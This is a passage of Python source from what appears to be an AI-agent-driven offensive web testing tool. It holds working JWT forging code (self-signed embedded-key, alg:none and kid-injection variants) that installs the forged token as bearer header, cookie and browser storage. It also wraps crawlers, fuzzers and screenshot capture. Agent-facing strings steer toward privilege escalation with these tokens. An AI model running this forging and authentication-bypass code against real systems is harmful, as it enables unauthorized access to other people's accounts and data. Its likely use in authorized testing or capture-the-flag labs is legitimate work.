            priv_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub_numbers = priv_key.public_key().public_numbers()

            def int_to_b64url(n: int) -> str:
                length = (n.bit_length() + 7) // 8
                return b64url_encode(n.to_bytes(length, "big"))

            jwk = {
                "kty": "RSA",
                "kid": "attacker-key",
                "use": "sig",
                "alg": "RS256",
                "n": int_to_b64url(pub_numbers.n),
                "e": int_to_b64url(pub_numbers.e),
            }
            hdr_jwk = dict(header)
            hdr_jwk["alg"] = "RS256"
            hdr_jwk["jwk"] = jwk
            hdr_b64 = b64url_encode(hdr_jwk)
            pay_b64 = b64url_encode(forged_payload)
            signing_input = f"{hdr_b64}.{pay_b64}".encode("utf-8")
            signature = priv_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
            tok_jwk = f"{hdr_b64}.{pay_b64}.{b64url_encode(signature)}"
            forged_tokens.append({
                "type": "jwk_injection (embedded RSA key)",
                "description": "Header carries an attacker-generated RSA public key in `jwk`; token is self-signed with the matching private key.",
                "token": tok_jwk
            })
        except ImportError:
            if emit and hasattr(emit, "info"):
                emit.info("[*] jwt_forge: skipping jwk_injection — `cryptography` package not installed (pip install cryptography).")

    # Prefer a legitimately-cracked token as primary; otherwise fall back to
    # the first generated variant (kept for backward-compat behavior).
    if cracked_secret is not None:
        primary_token = forged_tokens[0]["token"]
    else:
        primary_token = forged_tokens[0]["token"] if forged_tokens else token

    # Auto-update target state only if original token was a JWT
    if hasattr(target, "state") and isinstance(target.state, dict):
        target.state["auth_token"] = primary_token
        target.state["forged_token"] = primary_token
        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
            target.state["headers"] = {}
        target.state["headers"]["Authorization"] = f"Bearer {primary_token}"
        if "cookies" in target.state and isinstance(target.state["cookies"], dict):
            for ck, val in list(target.state["cookies"].items()):
                # Only replace if the original cookie value was actually the JWT
                if val == token or (isinstance(val, str) and val.startswith("eyJ")):
                    target.state["cookies"][ck] = primary_token
                    target.state["session_cookie"] = f"{ck}={primary_token}"
        save_target(target)

    hs_crack_available = (
        algo != "hs_crack"
        and bool(original_sig_b64)
        and header.get("alg", "").upper().startswith("HS")
    )

    return {
        "status": "success",
        "original_header": header,
        "original_payload": payload,
        "forged_payload": forged_payload,
        "primary_token": primary_token,
        "forged_tokens": forged_tokens,
        "techniques_run": techniques_run,
        "cracked_secret": cracked_secret,
        "hs_crack_available": hs_crack_available,
        "instructions": (
            "Primary forged token has been applied to target.state. Test the free/no-secret "
            "variants first (alg:none, kid_injection, jwk_injection) against discovered protected "
            "endpoints (e.g. /console, /dashboard) with curl/gowitness — these cost nothing and "
            "often work outright. "
            + (
                "Secret brute-forcing was NOT run this call. Only escalate to it if the free "
                "variants above are rejected: re-run jwt_forge with algorithm='hs_crack' (this "
                "token is HS-signed, so cracking applies)."
                if hs_crack_available else
                "If none of these pass, check the response body for details (some apps reject "
                "alg:none but leak the real secret via other means — try other forged_tokens "
                "variants individually)."
            )
        )
    }


def _execute_spider(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    depth = args.get("depth", 2)

    engine = HellhoundEngine()
    opts = {"depth": depth, "max_pages": 50, "target": url}

    # Propagate session cookies / auth headers from args or target.state for authenticated crawling
    cookie_candidate = args.get("cookies") or args.get("cookie")
    if not cookie_candidate and hasattr(target, "state") and isinstance(target.state, dict):
        cookie_candidate = target.state.get("session_cookie") or target.state.get("cookies")
    if cookie_candidate:
        opts["cookie"] = cookie_candidate

    headers_candidate = args.get("headers")
    if not headers_candidate and hasattr(target, "state") and isinstance(target.state, dict):
        headers_candidate = target.state.get("headers")
        if not headers_candidate and target.state.get("auth_token"):
            headers_candidate = {"Authorization": f"Bearer {target.state.get('auth_token')}"}
    if headers_candidate:
        opts["headers"] = headers_candidate

    try:
        res = engine.run_single("spider", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        if intel and hasattr(target, "state"):
            target.state["spider_intel"] = intel
        endpoints = [ep.get("url") for ep in intel.get("endpoints", []) if isinstance(ep, dict) and ep.get("url")]
        if endpoints and hasattr(target, "state"):
            if "endpoints" not in target.state:
                target.state["endpoints"] = []
            for ep in endpoints:
                if ep not in target.state["endpoints"]:
                    target.state["endpoints"].append(ep)

        # Extract JS-discovered routes and parameters properly from intel
        raw_eps = intel.get("endpoints", []) if isinstance(intel, dict) else []
        js_routes = []
        parameters = []
        for ep in raw_eps:
            if isinstance(ep, dict):
                srcs = ep.get("source", [])
                if any("JS" in str(s) or "SPA" in str(s) for s in srcs):
                    u = ep.get("url")
                    if u and u not in js_routes:
                        js_routes.append(u)
                for p in ep.get("params", []):
                    if p and str(p) not in parameters:
                        parameters.append(str(p))

        # Also extract parameters from forms and js_orphan_params
        for form in intel.get("forms", []):
            if isinstance(form, dict):
                for f_field in form.get("fields", []):
                    if isinstance(f_field, dict):
                        f_name = f_field.get("name")
                        if f_name and str(f_name) not in parameters:
                            parameters.append(str(f_name))

        for file_params in (intel.get("js_orphan_params") or {}).values():
            if isinstance(file_params, list):
                for p in file_params:
                    if p and str(p) not in parameters:
                        parameters.append(str(p))

        # Save discovered credentials and secrets into target state
        creds = intel.get("credentials", []) if isinstance(intel, dict) else []
        secrets = intel.get("secrets", []) if isinstance(intel, dict) else []
        if creds and hasattr(target, "state") and isinstance(target.state, dict):
            if "credentials" not in target.state or not isinstance(target.state["credentials"], list):
                target.state["credentials"] = []
            for c in creds:
                if c not in target.state["credentials"]:
                    target.state["credentials"].append(c)
        if secrets and hasattr(target, "state") and isinstance(target.state, dict):
            if "secrets" not in target.state or not isinstance(target.state["secrets"], list):
                target.state["secrets"] = []
            for s in secrets:
                if s not in target.state["secrets"]:
                    target.state["secrets"].append(s)

        try:
            update_from_spider(
                target,
                endpoints=endpoints,
                js_routes=js_routes,
                parameters=parameters,
            )
            save_target(target)
        except Exception:
            pass  # structured memory is best-effort — never let it break the actual crawl result

        return {
            "url": url,
            "endpoints_found": len(endpoints),
            "js_routes_found": len(js_routes),
            "parameters_found": len(parameters),
            "credentials_exposed": creds[:20],
            "secrets_exposed": secrets[:20],
            "sample_endpoints": endpoints[:30],
            "forms_found": len(intel.get("forms", [])),
            "parameters": parameters[:20],
            "crashed": bool(isinstance(res, dict) and res.get("crashed")),
            "tool_error": res.get("error") if isinstance(res, dict) else None
        }
    except Exception as e:
        return {"url": url, "error": f"Spider error: {e}"}


def _execute_wafbuster(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    engine = HellhoundEngine()
    try:
        res = engine.run_single("wafbuster", url, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"WAF check error: {e}"}


def _execute_surface_auditor(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {"spider_intel": spider_intel}
    engine = HellhoundEngine()
    try:
        res = engine.run_single("surface_auditor", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"Surface auditor error: {e}"}


def _execute_cors_checker(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {"spider_intel": spider_intel}
    engine = HellhoundEngine()
    try:
        res = engine.run_single("corsbuster", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"CORS check error: {e}"}


def _execute_graphql_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {"spider_intel": spider_intel}
    engine = HellhoundEngine()
    try:
        res = engine.run_single("graphql", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"GraphQL check error: {e}"}


def _execute_hydra(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Execute Hydra parameter and logic flaw analysis across discovered endpoints."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    if not spider_intel and "endpoints" in target.state:
        spider_intel = {"endpoints": [{"url": ep} if isinstance(ep, str) else ep for ep in target.state.get("endpoints", [])]}

    concurrency = args.get("concurrency", 10)
    enable_probing = args.get("enable_probing", False)
    opts = {
        "spider_intel": spider_intel,
        "concurrency": concurrency,
        "enable_probing": enable_probing,
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("hydra", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        surfaces = intel.get("surfaces", [])
        logic_chains = intel.get("logic_chains", [])
        vulns = intel.get("vulnerabilities", [])

        for v in vulns:
            finding = {
                "type": f"Logic Flaw / Param Anomaly ({v.get('parameter', '')})",
                "target": v.get("url", url),
                "severity": "HIGH" if v.get("impact_score", 0) >= 8 else "MEDIUM",
                "details": v.get("impact_path") or v.get("attack_chains", []),
                "verified": False
            }
            if finding not in target.findings:
                target.findings.append(finding)

        return {
            "url": url,
            "raw": res.get("raw", "") if isinstance(res, dict) else str(res),
            "surfaces_analyzed": len(surfaces),
            "logic_chains_found": len(logic_chains),
            "high_impact_vulnerabilities": len(vulns),
            "signals": res.get("signals", []) if isinstance(res, dict) else [],
            "top_findings": surfaces[:10]
        }
    except Exception as e:
        return {"url": url, "error": f"Hydra analysis error: {e}"}


def _execute_cloudscout(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan application and recon text for cloud infrastructure assets."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    verify_public = args.get("verify_public", False)
    opts = {
        "spider_intel": spider_intel,
        "verify_public": verify_public
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("cloudscout", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        assets = intel.get("assets", [])
        providers = intel.get("providers", [])
        return {
            "url": url,
            "assets_found": len(assets),
            "providers": providers,
            "assets": assets[:25],
            "risk_score": intel.get("risk_score", 0),
            "signals": intel.get("signals", [])
        }
    except Exception as e:
        return {"url": url, "error": f"CloudScout error: {e}"}


def _execute_transport_auditor(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Audit transport security: SSL certs, HTTPS/HSTS, and cookie security flags."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {
        "spider_intel": spider_intel,
        "check_ssl": args.get("check_ssl", True),
        "check_https": args.get("check_https", True),
        "check_cookies": args.get("check_cookies", True),
        "check_payment": args.get("check_payment", True),
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("transport_auditor", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        findings = intel.get("findings", [])
        risk_score = res.get("risk_score", 0) if isinstance(res, dict) else 0

        for f in findings:
            if f.get("severity", 0) >= 15:
                finding = {
                    "type": f"Transport Security: {f.get('name', 'Issue')}",
                    "target": url,
                    "severity": "HIGH" if f.get("severity", 0) >= 30 else "MEDIUM",
                    "description": f.get("description", ""),
                    "verified": True
                }
                if finding not in target.findings:
                    target.findings.append(finding)

        return {
            "url": url,
            "findings_count": len(findings),
            "findings": findings,
            "risk_score": risk_score,
            "signals": res.get("signals", []) if isinstance(res, dict) else []
        }
    except Exception as e:
        return {"url": url, "error": f"Transport auditor error: {e}"}


def _execute_fuzz_hunter(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Run recursive path fuzzing with 404 similarity baseline heuristics."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {
        "spider_intel": spider_intel,
        "max_depth": args.get("max_depth", 2),
        "threads": args.get("threads", 10),
        "quick": args.get("quick", False),
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("fuzz_hunter", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        endpoints = intel.get("endpoints", [])
        return {
            "url": url,
            "endpoints_found": len(endpoints),
            "endpoints": endpoints[:30],
            "signals": res.get("signals", []) if isinstance(res, dict) else []
        }
    except Exception as e:
        return {"url": url, "error": f"FUZZhunter error: {e}"}


def _execute_gowitness(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Capture web screenshots via gowitness and store them directly in the target workspace."""
    from datetime import datetime, timezone
    from hellhound.memory import update_from_gowitness

    url = args.get("url") or args.get("target") or ""
    urls = args.get("urls") or []

    if isinstance(urls, str):
        urls = [u.strip() for u in urls.split(",") if u.strip()]

    target_urls: List[str] = []
    if url:
        u = str(url).strip()
        if not u.startswith(("http://", "https://")):
            u = f"https://{u}"
        target_urls.append(u)
    for u in urls:
        u = str(u).strip()
        if u:
            if not u.startswith(("http://", "https://")):
                u = f"https://{u}"
            if u not in target_urls:
                target_urls.append(u)

    if not target_urls:
        t_name = target.name.strip()
        if t_name and t_name != "default":
            if not t_name.startswith(("http://", "https://")):
                target_urls.append(f"https://{t_name}")
            else:
                target_urls.append(t_name)

    if not target_urls:
        return {"error": "No URL or target specified for gowitness screenshot capture."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("gowitness", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "gowitness not installed",
            "message": check["message"],
            "hint": "go install github.com/sensepost/gowitness@latest"
        }

    binary = get_binary_path("gowitness") or "gowitness"

    # Setup screenshot output directory
    target_safe_name = sanitize_target_name(target.name)
    custom_dir = args.get("output_dir") or args.get("screenshot_path")
    if custom_dir:
        screenshots_dir = Path(os.path.expanduser(custom_dir)).resolve()
    else:
        screenshots_dir = Path(os.path.expanduser(f"~/.hellhound/targets/{target_safe_name}/screenshots")).resolve()

    screenshots_dir.mkdir(parents=True, exist_ok=True)

    delay = int(args.get("delay", 2))
    fullpage = bool(args.get("fullpage", False))

    # Resolve headers and session cookies for authenticated screenshots
    custom_headers = normalize_headers(args.get("headers"))
    cookies_dict = normalize_cookies(args.get("cookies") or args.get("cookie"))

    # Auto-attach saved session cookies and headers from target.state
    if hasattr(target, "state") and isinstance(target.state, dict):
        saved_cookies = normalize_cookies(target.state.get("cookies") or target.state.get("session_cookie"))
        for k, v in saved_cookies.items():
            cookies_dict.setdefault(k, v)
        saved_headers = normalize_headers(target.state.get("headers"))
        for k, v in saved_headers.items():
            custom_headers.setdefault(k, v)
        saved_token = target.state.get("auth_token") or target.state.get("forged_token")
        if saved_token and not any(k.lower() == "authorization" for k in custom_headers):
            custom_headers["Authorization"] = f"Bearer {saved_token}"

    # Build cookie header if cookies present
    if cookies_dict:
        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())
        if not any(k.lower() == "cookie" for k in custom_headers):
            custom_headers["Cookie"] = cookie_header

    merged_headers = merge_global_context({"global_headers": custom_headers})

    chrome_bin = _find_binary("chromium") or _find_binary("google-chrome") or _find_binary("chrome")
    chromedriver_bin = _find_binary("chromedriver")

    captured_items: List[Dict[str, Any]] = []

    # Attempt 1: High-fidelity Selenium + CDP pre-navigation cookie/header injection
    selenium_success = False
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.service import Service
        from selenium.webdriver.chrome.options import Options
        from urllib.parse import urlparse

        if chrome_bin and chromedriver_bin:
            opts = Options()
            opts.binary_location = chrome_bin
            opts.add_argument("--headless=new")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            opts.add_argument("--disable-gpu")
            opts.add_argument("--window-size=1440,900")
            opts.add_argument("--ignore-certificate-errors")

            service = Service(executable_path=chromedriver_bin)
            driver = webdriver.Chrome(service=service, options=opts)
            try:
                for target_url in target_urls:
                    parsed_u = urlparse(target_url)
                    host = parsed_u.hostname or ""

                    driver.execute_cdp_cmd("Network.enable", {})

                    non_cookie_headers = {k: v for k, v in merged_headers.items() if k.lower() != "cookie"}
                    if non_cookie_headers:
                        driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {"headers": non_cookie_headers})

                    if cookies_dict and host:
                        for c_k, c_v in cookies_dict.items():
                            try:
                                driver.execute_cdp_cmd("Network.setCookie", {
                                    "name": c_k,
                                    "value": c_v,
                                    "domain": host,
                                    "path": "/",
                                    "secure": target_url.startswith("https"),
                                    "httpOnly": False
                                })
                            except Exception:
                                pass

                    driver.get(target_url)

                    # Inject token into localStorage / sessionStorage for SPAs
                    auth_tok = target.state.get("auth_token") or target.state.get("forged_token") if hasattr(target, "state") and isinstance(target.state, dict) else None
                    if auth_tok:
                        try:
                            driver.execute_script('''
                                try {
                                    localStorage.setItem('token', arguments[0]);
                                    localStorage.setItem('auth_token', arguments[0]);
                                    localStorage.setItem('jwt', arguments[0]);
                                    sessionStorage.setItem('token', arguments[0]);
                                } catch(e) {}
                            ''', auth_tok)
                        except Exception:
                            pass

                    import time
                    time.sleep(max(1, delay))

                    safe_slug = re.sub(r'[^a-zA-Z0-9_\-\.]', '-', target_url).strip('-')
                    if not safe_slug:
                        safe_slug = "screenshot"
                    out_file = screenshots_dir / f"{safe_slug}.png"

                    if fullpage:
                        try:
                            total_height = driver.execute_script("return Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, 900);")
                            driver.set_window_size(1440, min(int(total_height), 8000))
                            time.sleep(0.3)
                        except Exception:
                            pass

                    driver.save_screenshot(str(out_file))

                    page_text = ""
                    try:
                        page_text = driver.find_element("tag name", "body").text or ""
                    except Exception:
                        page_text = driver.page_source or ""

                    lower_text = page_text.lower()
                    lower_title = (driver.title or "").lower()

                    access_denied_signals = []
                    for phrase in [
                        "403", "401", "owner access required", "access denied",
                        "restricted to workspace owners", "restricted to owners",
                        "restricted to administrators", "admin access required",
                        "unauthorized", "permission denied", "forbidden",
                        "sign in to continue", "log in to your account"
                    ]:
                        if phrase in lower_title or phrase in lower_text:
                            access_denied_signals.append(phrase)

                    access_verdict = "DENIED / RESTRICTED" if access_denied_signals else "SUCCESS / ACCESSIBLE"

                    item_info = {
                        "url": target_url,
                        "final_url": driver.current_url or target_url,
                        "title": driver.title or target_url,
                        "response_code": 200,
                        "access_verdict": access_verdict,
                        "access_denied_signals": list(set(access_denied_signals)),
                        "file_path": str(out_file),
                        "file_name": out_file.name,
                        "file_size": out_file.stat().st_size if out_file.exists() else 0,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "technologies": [],
                    }
                    if access_denied_signals:
                        item_info["warning"] = f"PAGE INDICATES ACCESS RESTRICTION: Found '{', '.join(set(access_denied_signals))}'. This endpoint is NOT fully unlocked."
                    captured_items.append(item_info)
                selenium_success = True
            finally:
                try:
                    driver.quit()
                except Exception:
                    pass
    except Exception:
        selenium_success = False

    # Attempt 2: Fallback to gowitness binary if Selenium was not available or failed
    if not selenium_success:
        auto_install = bool(load_config().get("auto_install_missing_tools", False))
        check = ensure_tool("gowitness", emit=emit, auto_install=auto_install)
        binary = get_binary_path("gowitness") or "gowitness"

        if check["available"]:
            import tempfile
            with tempfile.TemporaryDirectory() as tmp_dir:
                jsonl_path = Path(tmp_dir) / "gowitness_results.jsonl"
                cookie_header = merged_headers.get("Cookie")

                if len(target_urls) == 1:
                    target_url = target_urls[0]
                    cmd = [
                        binary, "scan", "single",
                        "-u", target_url,
                        "-s", str(screenshots_dir),
                        "--screenshot-format", "png",
                        "--delay", str(delay),
                        "--write-jsonl",
                        "--write-jsonl-file", str(jsonl_path),
                    ]
                    if fullpage:
                        cmd.append("--screenshot-fullpage")
                    if chrome_bin:
                        cmd.extend(["--chrome-path", chrome_bin])
                    for h_k, h_v in merged_headers.items():
                        cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
                    if cookie_header:
                        clean_cookie = cookie_header.replace("'", "\\'")
                        cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])

                    try:
                        _run_cmd_with_heartbeat(cmd, timeout=120, emit=emit, label="gowitness (screenshot capture)")
                    except Exception as e:
                        return {"error": f"gowitness execution failed: {e}", "url": target_url}
                else:
                    targets_file = Path(tmp_dir) / "targets.txt"
                    targets_file.write_text("\n".join(target_urls) + "\n")
                    cmd = [
                        binary, "scan", "file",
                        "-f", str(targets_file),
                        "-s", str(screenshots_dir),
                        "--screenshot-format", "png",
                        "--delay", str(delay),
                        "--write-jsonl",
                        "--write-jsonl-file", str(jsonl_path),
                    ]
                    if fullpage:
                        cmd.append("--screenshot-fullpage")
                    if chrome_bin:
                        cmd.extend(["--chrome-path", chrome_bin])
                    for h_k, h_v in merged_headers.items():
                        cmd.extend(["--chrome-header", f"{h_k}: {h_v}"])
                    if cookie_header:
                        clean_cookie = cookie_header.replace("'", "\\'")
                        cmd.extend(["--javascript", f"() => {{ document.cookie = '{clean_cookie}; path=/'; }}"])

                    try:
                        _run_cmd_with_heartbeat(cmd, timeout=300, emit=emit, label="gowitness (batch screenshot capture)", heartbeat_interval=10)
                    except Exception as e:
                        return {"error": f"gowitness batch execution failed: {e}", "urls": target_urls}

                if jsonl_path.exists():
                    for line in jsonl_path.read_text().splitlines():
                        if not line.strip():
                            continue
                        try:
                            data = json.loads(line)
                            fname = data.get("file_name", "")
                            screenshot_file = str(screenshots_dir / fname) if fname else ""
                            if not (screenshot_file and os.path.exists(screenshot_file)):
                                for f in screenshots_dir.glob("*.png"):
                                    if fname and str(f).endswith(fname):
                                        screenshot_file = str(f)
                                        break

                            item_info = {
                                "url": data.get("url", ""),
                                "final_url": data.get("final_url", ""),
                                "title": data.get("title", ""),
                                "response_code": data.get("response_code", 0),
                                "file_path": screenshot_file,
                                "file_name": fname,
                                "timestamp": datetime.now(timezone.utc).isoformat(),
                                "technologies": [t.get("value") for t in data.get("technologies", []) if isinstance(t, dict) and t.get("value")],
                            }
                            if screenshot_file and os.path.exists(screenshot_file):
                                item_info["file_size"] = os.path.getsize(screenshot_file)
                            captured_items.append(item_info)
                        except Exception:
                            continue

    # Fallback to directory scan if jsonl parsing was empty
    if not captured_items:
        for f in screenshots_dir.glob("*.png"):
            captured_items.append({
                "url": target_urls[0] if target_urls else target.name,
                "file_path": str(f),
                "file_name": f.name,
                "file_size": f.stat().st_size,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            })

    if captured_items:
        update_from_gowitness(target, captured_items)
        save_target(target)

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Gowitness captured {len(captured_items)} screenshot(s) in {screenshots_dir}")

    denied_items = [it for it in captured_items if it.get("access_verdict") == "DENIED / RESTRICTED" or it.get("warning")]
    result_payload: Dict[str, Any] = {
        "status": "success",
        "screenshots_count": len(captured_items),
        "screenshots_dir": str(screenshots_dir),
        "screenshots": captured_items
    }
    if denied_items:
        result_payload["access_verification_warning"] = (
            "CRITICAL: One or more captured screenshots display ACCESS DENIAL or RESTRICTION banners "
            "(e.g. '403 · Owner access required', 'Forbidden', 'Access Denied'). "
            "The active session has NOT achieved administrative/owner access on these routes. "
            "Do NOT record this as a successful privilege escalation. Continue testing alternative vectors (e.g. Mass Assignment, nested property injection, client JS analysis)."
        )

    return result_payload


def _execute_record_finding(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Logs a finding YOU have already confirmed (not a guess or a plan) into
    structured investigation memory — evidence cards, timeline, and the
    running investigation summary the orchestrator sees on every later turn.
    This does not test anything itself; it only records a result you
    already obtained via curl/spider/other tools.
    """
    title = str(args.get("title", "")).strip()
    if not title:
        return {"error": "title is required — describe the confirmed finding in one line."}
    kind = str(args.get("kind", "interesting_endpoint")).strip().lower()
    severity = str(args.get("severity", "medium")).strip().lower()
    request_ref = str(args.get("request_ref", "")).strip()
    note = str(args.get("note", "")).strip()

    # Dedup: the storage layer's own dedup keys on the WHOLE finding dict,
    # which differs any time the title is reworded even slightly — this let
    # the same flag get logged 5+ times under different titles ("Flag
    # captured: X", "Flag confirmed: X", "Mission complete: X"...) in one
    # session. Catch that here: if this finding contains the same flag-shaped
    # token (WORD{...}) as an existing finding, or is an exact duplicate of
    # an existing (kind, request_ref, title), it's already recorded — don't
    # append another copy.
    existing_findings = target.findings if isinstance(target.findings, list) else []
    flag_match = _FLAG_TOKEN_PATTERN.search(f"{title} {note}")
    for f in existing_findings:
        if not isinstance(f, dict):
            continue
        f_text = f"{f.get('type', '')} {f.get('note', '')}"
        if flag_match:
            existing_flag = _FLAG_TOKEN_PATTERN.search(f_text)
            if existing_flag and existing_flag.group(0) == flag_match.group(0):
                return {
                    "status": "already_recorded",
                    "note": f"Already recorded — flag {flag_match.group(0)} is already in findings under '{f.get('type', '')}'. No need to log it again under a new title.",
                }
        elif (
            f.get("target", "").strip().lower() == request_ref.strip().lower()
            and f.get("type", "").strip().lower() == title.strip().lower()
        ):
            return {
                "status": "already_recorded",
                "note": "Already recorded — identical finding (same title and endpoint) already exists."
            }

    finding = {"type": title, "target": request_ref, "severity": severity, "note": note}
    try:
        update_from_bac(target, findings=[finding])
        save_target(target)
    except Exception as e:
        return {"error": f"Failed to record finding: {e}"}

    if emit and hasattr(emit, "success"):
        emit.success(f"[✓] Finding recorded: {title}")
    return {"status": "recorded", "title": title, "kind": kind, "severity": severity}


def _execute_load_skill(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Loads a skill's full methodology content on demand, by name, from the skill menu."""
    name = str(args.get("name", "")).strip()
    if not name:
        return {"error": "name is required — see the SKILL MENU in your system prompt for available names."}
    registry = discover_skills()
    if name not in registry:
        available = ", ".join(sorted(registry.keys()))
        return {"error": f"No skill named '{name}'. Available: {available}"}
    body = load_skill_body(name)
    if not body:
        return {"error": f"Skill '{name}' has no content."}
    return {
        "skill": name,
        "content_type": "REFERENCE_DOCUMENTATION — not target data",
        "warning": (
            "Everything below is generic methodology reference material. It is NOT "
            "reconnaissance output and contains NO information about the current "
            "target. Any email address, domain, username, token, or identifier that "
            "appears in this content (e.g. 'admin@target.com', 'victim@x.com', "
            "'Admin@X.com') is a placeholder used to illustrate a technique's SYNTAX "
            "— it was never observed on the actual target and must NEVER be tested "
            "against it, submitted in a login/reset/API request, or reported as a "
            "'harvested' or 'discovered' credential. Only identifiers that appear in "
            "the response of an actual curl/spider/tool call against the real target "
            "are real. If this skill's methodology calls for a specific identifier "
            "(a username, an email), get it from your own prior tool results on this "
            "target, not from this document."
        ),
        "methodology": body,
    }


def _execute_read_artifact(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Reads a line-range slice of a raw tool output artifact saved under the target's raw/ directory."""
    path = str(args.get("path", "")).strip()
    if not path:
        return {"error": "path is required."}

    try:
        offset = int(args.get("offset", 0))
    except (ValueError, TypeError):
        offset = 0

    try:
        length = int(args.get("length", 200))
    except (ValueError, TypeError):
        length = 200

    target_name = target.name if (target and hasattr(target, "name") and target.name) else "default"
    base_dir = os.path.realpath(os.path.expanduser(f"~/.hellhound/targets/{target_name}/raw"))
    abs_path = os.path.realpath(os.path.expanduser(path))

    # Path traversal validation: path must be strictly within target's raw/ directory
    try:
        if os.path.commonpath([abs_path, base_dir]) != base_dir:
            return {"error": f"Access denied: Path '{path}' is not within target raw directory '{base_dir}'."}
    except Exception:
        return {"error": f"Access denied: Path '{path}' is outside target raw directory '{base_dir}'."}

    if not os.path.exists(abs_path) or not os.path.isfile(abs_path):
        return {"error": f"File not found: '{path}'."}

    try:
        with open(abs_path, "r", encoding="utf-8", errors="replace") as f:
            all_lines = f.readlines()

        total_lines = len(all_lines)
        start_line = max(0, offset)
        end_line = start_line + max(1, length)
        lines_slice = all_lines[start_line:end_line]
        content_slice = "".join(lines_slice)

        if emit and hasattr(emit, "info"):
            emit.info(f"[read_artifact] Reading lines {start_line}-{start_line + len(lines_slice)} from {os.path.basename(abs_path)}")

        return {
            "status": "success",
            "path": abs_path,
            "offset": start_line,
            "length": len(lines_slice),
            "total_lines": total_lines,
            "content": content_slice,
        }
    except Exception as e:
        return {"error": f"Failed to read artifact file '{path}': {e}"}


# Tool Registry Map
TOOL_REGISTRY: Dict[str, ToolSpec] = {
    "read_artifact": ToolSpec(
        name="read_artifact",
        description="Read a line-range slice of a raw tool output artifact saved to target storage (~/.hellhound/targets/<target>/raw/). Use this tool when previous tool output was truncated (indicated by [FULL OUTPUT SAVED: ...]) and you need to inspect a specific line range or middle section of the output.",
        parameters={
            "type": "object",
            "properties": {
                "path": {"type": "string", "description": "Full file path of the saved raw artifact (e.g. ~/.hellhound/targets/example.com/raw/spider_20260828T120000.txt)."},
                "offset": {"type": "integer", "description": "Starting line number (0-indexed). Default is 0.", "default": 0},
